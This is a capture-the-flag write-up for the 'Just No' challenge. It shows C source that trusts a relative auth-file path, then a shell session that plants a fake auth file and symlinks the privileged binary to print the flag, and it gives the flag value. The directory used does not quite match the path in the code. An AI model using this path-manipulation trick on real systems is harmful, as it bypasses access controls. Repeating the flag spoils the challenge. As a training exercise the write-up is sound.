# Just No [ 40 Pts ]

## Problem

A program at /problems/ab718be873f8a7efe966f4ed5af749eb has access to a flag but refuses to share it. Can you convince it otherwise?

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>


int main(int argc, char **argv){ 
  FILE* authf = fopen("../../problems/f49abea6827cafa20a035340d3812d09/auth","r"); //access auth file in ../../../problems/f49abea6827cafa20a035340d3812d09
  if(authf == NULL){
    printf("could not find auth file in ../../problems/f49abea6827cafa20a035340d3812d09/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/f49abea6827cafa20a035340d3812d09/flag","r");
    char flag[64];
    fgets(flag,64,flagf);
    printf("Oh. Well the auth file doesn't say no anymore so... Here's the flag: %s",flag);
    fclose(flagf);
  }else{
    printf("auth file says no. So no. Just... no.\n");
  }
  return 0;
}
```

## Approach

We can see from the source code that the program uses relative path.
This can be bypassed by creating a symbolic link to the program at our home directory that is writable to us.

```
XXXXXXX@shell-web:~$ mkdir ~/problems/ab718be873f8a7efe966f4ed5af749eb

XXXXXXX@shell-web:~$ cd ~/problems/ab718be873f8a7efe966f4ed5af749eb

XXXXXXX@shell-web:~/problems/ab718be873f8a7efe966f4ed5af749eb$ echo yes > auth

XXXXXXX@shell-web:~/problems/ab718be873f8a7efe966f4ed5af749eb$ ln -s /problems/ab718be873f8a7efe966f4ed5af749eb/justno justno                           

XXXXXXX@shell-web:~/problems/ab718be873f8a7efe966f4ed5af749eb$ ls -l       
total 4
-rw-r--r-- 1 XXXXXXX XXXXXXX  4 May 10  2017 auth
lrwxrwxrwx 1 XXXXXXX XXXXXXX 49 Jun 21 15:42 justno -> /problems/ab718be873f8a7efe966f4ed5af749eb/justno

XXXXXXX@shell-web:~/problems/ab718be873f8a7efe966f4ed5af749eb$ ./justno 
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 3a7cbd7c24f7d5369308333b045382e7

```

(Completed)
